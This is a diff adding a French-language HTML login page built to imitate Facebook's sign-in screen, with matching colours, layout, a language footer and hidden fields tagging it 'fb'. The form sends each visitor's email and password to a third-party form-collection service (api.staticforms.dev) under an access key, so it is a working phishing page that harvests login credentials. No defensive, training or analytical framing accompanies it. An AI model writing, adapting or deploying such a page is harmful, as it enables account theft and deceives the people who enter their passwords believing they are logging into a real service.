@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexionk</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  background: #f0f2f5;
+}
+
+/* HEADER */
+.header {
+  background: white;
+  padding: 10px 40px;
+  border-bottom: 1px solid #ddd;
+  display: flex;
+  align-items: center;
+}
+
+
+
+/* MAIN */
+.main {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 85vh;
+  padding: 20px;
+}
+
+/* GAUCHE */
+.left {
+  width: 420px;
+  margin-right: 60px;
+}
+
+.left img {
+  width: 250px;
+  margin-bottom: 15px;
+}
+
+.left h1 {
+  font-size: 28px;
+  margin-bottom: 10px;
+}
+
+.left p {
+  font-size: 18px;
+  color: #444;
+}
+
+/* DROITE */
+.right {
+  background: white;
+  padding: 25px;
+  width: 360px;
+  border-radius: 10px;
+  box-shadow: 0 5px 12px rgba(0,0,0,0.1);
+}
+
+.right h2 {
+  text-align: center;
+  margin-bottom: 15px;
+  font-size: 20px;
+}
+
+/* INPUT */
+input {
+  width: 100%;
+  padding: 13px;
+  margin: 8px 0;
+  border: 1px solid #ddd;
+  border-radius: 6px;
+  font-size: 14px;
+}
+
+/* BUTTON */
+button {
+  width: 100%;
+  padding: 13px;
+  background: #1877f2;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  font-size: 16px;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #0f5bd8;
+}
+
+/* LINKS */
+.link {
+  text-align: center;
+  margin-top: 10px;
+}
+
+.link a {
+  color: #1877f2;
+  text-decoration: none;
+  font-size: 14px;
+}
+
+/* CREATE BUTTON */
+.create {
+  background: #42b72a;
+  margin-top: 15px;
+}
+
+.create:hover {
+  background: #36a420;
+}
+
+/* FOOTER */
+.footer {
+  background: white;
+  border-top: 1px solid #ddd;
+  padding: 15px 10px;
+}
+
+.languages {
+  text-align: center;
+}
+
+.languages a {
+  color: #737373;
+  margin: 0 8px;
+  font-size: 13px;
+  text-decoration: none;
+}
+
+.languages a:hover {
+  text-decoration: underline;
+}
+
+/* RESPONSIVE MOBILE */
+@media (max-width: 768px) {
+
+  .main {
+    flex-direction: column;
+    height: auto;
+  }
+
+  .left {
+    width: 100%;
+    margin-right: 0;
+    text-align: center;
+    margin-bottom: 20px;
+  }
+
+  .left img {
+    width: 180px;
+  }
+
+  .right {
+    width: 100%;
+    max-width: 350px;
+  }
+
+  .header {
+    justify-content: center;
+  }
+}
+</style>
+
+</head>
+
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  
+</div>
+
+<!-- MAIN -->
+<div class="main">
+
+  <!-- GAUCHE -->
+  <div class="left">
+    <img src="logo.png">
+    
+    <p>Connecte-toi pour accéder à ton espace et gérer ton activité facilement.</p>
+  </div>
+
+  <!-- DROITE -->
+  <div class="right">
+
+    <h2>Se connecter </h2>
+
+<form action="https://api.staticforms.dev/submit" method="POST">
+  <input type="hidden" name="accessKey" value="sf_mh67m4allbmf7bih979cjh7m">
+
+    <input type="email" id="email" name="email" placeholder="Email" required>
+    <input type="password" id="password"  name="password" placeholder="mot de passe" required>
+    <input type="hidden" name="subject" value="Message -fb">
+  <input type="hidden" name="site" value="fb">
+
+  <button type="submit">Envoyer</button>
+</form>
+    <div class="link">
+      <a href="#">Mot de passe oublié ?</a>
+    </div>
+
+    <button class="create">Créer un compte</button>
+
+  </div>
+
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+  <div class="languages">
+    <a href="#">Français</a>
+    <a href="#">English (US)</a>
+    <a href="#">Español</a>
+    <a href="#">Português</a>
+    <a href="#">العربية</a>
+    <a href="#">Deutsch</a>
+    <a href="#">Italiano</a>
+    <a href="#">+</a>
+  </div>
+</div>
+
+</body>
+</html>
